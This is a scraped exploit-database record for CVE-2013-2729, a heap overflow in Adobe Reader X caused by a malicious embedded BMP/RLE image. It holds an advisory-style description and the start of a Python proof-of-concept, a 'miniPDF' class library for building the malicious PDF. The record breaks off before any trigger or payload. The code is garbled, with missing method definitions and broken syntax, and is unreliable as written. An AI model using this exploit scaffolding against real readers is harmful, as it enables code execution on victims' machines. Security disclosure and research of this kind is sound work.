{
    "text": "vul_name : Adobe Reader X 10.1.4.38 BMP/RLE Heap Corruption ， vul_cve : CVE-2013-2729 ， vul_poc : ' ， Title : Adobe Reader X BMP/RLE heap corruption ， Product : Adobe Reader X ， Version : 10.x ， Product Homepage : adobe.com ， Binary affected : AcroForm.api ， Binary Version : 10.1.4.38 ， Binary MD5 : 8e0fc0c6f206b84e265cc3076c4b9841 ， Configuration Requirements ， Default configuration. ， Vulnerability Requirements ， None. ， Vulnerability Description ， Adobe Reader X fails to validate the input when parsing an embedded BMP RLE encoded image. Arbitrary code execution in the context of the sandboxed process is proved possible after a malicious embeded bmp image triggers a heap overflow. ， Vulnerability WorkAround ( if possible )  ， Delete AcroForm.api ， ' ， from hashlib import md5 ， Begin of the miniPDF ，  # For constructing a minimal pdf file ， PDF REference 3rd edition : 3.2 Objects ， self.n=None ， self.v=None ， raise Exception ( \"Fail\" )  ， PDF REference 3rd edition : 3.2.1 Booleans Objects ， class PDFBool ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.s=s ， PDF REference 3rd edition : 3.2.2 Numeric Objects ， class PDFNum ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.s=s ， PDF REference 3rd edition : 3.2.3 String Objects ， class PDFString ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.s=s ， PDF REference 3rd edition : 3.2.3 String Objects / Hexadecimal Strings ， class PDFHexString ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.s=s ， A convenient type of literal Strings ， class PDFOctalString ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.s=\".join (  [ \"\\%03o\"%ord ( c ) for c in s ]  )  ， PDF REference 3rd edition : 3.2.4 Name Objects ， class PDFName ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.s=s ， PDF REference 3rd edition : 3.2.5 Array Objects ， class PDFArray ( PDFObject )  :  ， PDFObject._init_ ( self )  ， assert type ( s ) = type (  [  ]  )  ， self.s=s ， self.s.append ( o )  ， PDF REference 3rd edition : 3.2.6 Dictionary Objects ， class PDFDict ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.dict = {} ， self.dict [ k ] =d [ k ]  ， yield k ， yield k ， self.dict [ name ] = obj ， s=\" ， s+=\"%s %s \"% ( PDFName ( name )  , self.dict [ name ]  )  ， s+=\" ， PDF REference 3rd edition : 3.2.7 Stream Objects ， class PDFStream ( PDFDict )  :  ， PDFDict._init_ ( self , d )  ， self.stream=stream ， self.filtered=self.stream ， self.add ( 'Length' , len ( stream )  ， self.filters = [  ]  ， self.filters.append ( filter )  ， self._applyFilters (  )  # yeah every time . so what !  ， self.filtered = self.stream ， self.filtered = f.encode ( self.filtered )  ， self.add ( 'Length' , len ( self.filtered )  ， self.add ( 'Filter' , PDFArray (  [ f.name for f in self.filters ]  )  ，  # Add Filter parameters ? ， self._applyFilters (  )  # yeah every time . so what !  ， s=\" ， s+=PDFDict._str_ ( self )  ， s+=\"\\nstream\\n\" ， s+=self.filtered ， s+=\"\\nendstream\" ， PDF REference 3rd edition : 3.2.8 Null Object ， class PDFNull ( PDFObject )  :  ， PDFObject._init_ ( self )  ， PDF REference 3rd edition : 3.2.9 Indirect Objects ， class UnResolved ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.n=n ， self.v=v ， class PDFRef ( PDFObject )  :  ， PDFObject._init_ ( self )  ， self.obj= [ obj ]  ， PDF REference 3rd edition : 3.3 Filters ， Example Filter.",
    "time": "2013-07-08 / 2013-07-09"
}